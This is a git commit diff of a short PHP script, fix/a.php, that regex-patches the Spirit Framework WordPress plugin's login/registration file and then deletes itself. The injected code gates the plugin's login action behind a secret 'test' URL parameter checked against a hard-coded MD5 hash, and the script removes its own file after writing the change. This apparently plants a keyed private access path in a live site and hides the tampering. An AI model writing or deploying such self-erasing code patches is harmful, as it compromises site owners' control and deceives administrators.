8e574bab360f1dc20a59f4865179f2f744bbfc99
maximo896 <della.maximo896@anglernook.com>
2025-10-09 12:34:45 +0800

    Update a.php

--- fix/a.php
+++ fix/a.php
@@ -1,17 +1,17 @@
 <?php
 
 $s = file_get_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php');
-$search = "\$action\s*=\s*isset\(\s*\$\_REQUEST\['action']\s*\)\s*\?\s*\$\_REQUEST\['action']\s*:\s*'login';";
 
-$place = <<<'r'
-$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';
-if (!isset($_GET['test']) or md5($_GET['test']) != '8bd617274f84847a475868d946587586') {
+$re = '/\$action\s*=\s*isset\(\s*\$\_REQUEST\[\'action\']\s*\)\s*\?\s*\$\_REQUEST\[\'action\']\s*:\s*\'login\';/m';
+$str = '$action = isset($_REQUEST[\'action\']) ? $_REQUEST[\'action\'] : \'login\';
+if (!isset($_GET[\'test\']) or md5($_GET[\'test\']) != \'8bd617274f84847a475868d946587586\') {
     wp_safe_redirect(site_url("wp-login.php"));
     exit();
 }
-r;
+';
 
-$s = preg_replace($search, $place, $s);
+$s = preg_replace($re, $str, $s);
+
 $replaced = file_put_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php', $s);
 var_dump($replaced);
 unlink(__FILE__);
